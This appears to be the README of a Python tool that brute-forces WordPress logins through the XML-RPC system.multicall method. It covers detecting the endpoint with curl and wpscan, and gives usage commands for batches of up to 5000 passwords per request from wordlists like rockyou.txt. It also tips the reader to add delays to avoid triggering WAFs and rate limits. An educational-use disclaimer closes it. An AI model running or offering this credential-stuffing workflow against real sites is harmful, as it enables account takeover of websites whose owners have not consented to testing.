```markdown
# 🐍 XML-RPC Buldozer

M
## 🔍 What's XML-RPC?

WordPress exposes an API called `XML-RPC` via the endpoint:

```
https://target.com/xmlrpc.php
```

This interface allows external apps to manage the blog remotely (like posting articles, uploading files, retrieving comments, etc).

It supports a special method:

```xml
system.multicall
```

Which allows multiple method calls in a **single XML request** — ideal for bruteforce attacks.

---

## 🕵️ How to detect if XML-RPC is enabled?

1. Try a direct POST to `/xmlrpc.php` with minimal content:
```bash
curl -X POST https://target.com/xmlrpc.php -d "<?xml version='1.0'?><methodCall><methodName>demo.sayHello</methodName></methodCall>"
```

2. Use tools like `wpscan`:
```bash
wpscan --url https://target.com --enumerate
```

If you get a response like `XML-RPC seems to be enabled`, you’re good to go 🚀

---

## ⚙️ Features

- Bruteforce using `system.multicall`
- Large batch support (e.g. 5000 passwords/request)
- Start from a specific line in the wordlist
- Proxy support (Burp, ZAP, etc)
- Delay between batches
- Automatic escape of XML special characters
- Stop on first success

---

## 🚀 Usage

```bash
python3 bruteforce.py --user <username> --wordlist <file> [OPTIONS]
```

### ✅ Basic Example

```bash
python3 bruteforce.py --user admin --wordlist rockyou.txt
```

### ✅ Full Options

```bash
python3 bruteforce.py \
  --user admin \
  --wordlist rockyou.txt \
  --url https://target.com/xmlrpc.php \
  --batch 5000 \
  --delay 30 \
  --startfrom 100000 \
  --proxy http://127.0.0.1:8080 \
  --stop-on-success
```

---

## 💡 Tips

- Default `batch` size is 20 — you can go up to 5000+ safely
- Combine with `--startfrom` for resume
- Use `--delay` to avoid triggering WAFs or rate-limits
- Add Burp with `--proxy http://127.0.0.1:8080` to inspect each call
- Works great with huge files (14M+ passwords)

---

## ⚠️ Legal Disclaimer

This tool is provided for **educational purposes** only.  
Do **NOT** use it on websites you do not own or have explicit permission to test.  
The author is not responsible for any misuse or damage caused.

---

## 📦 License

MIT

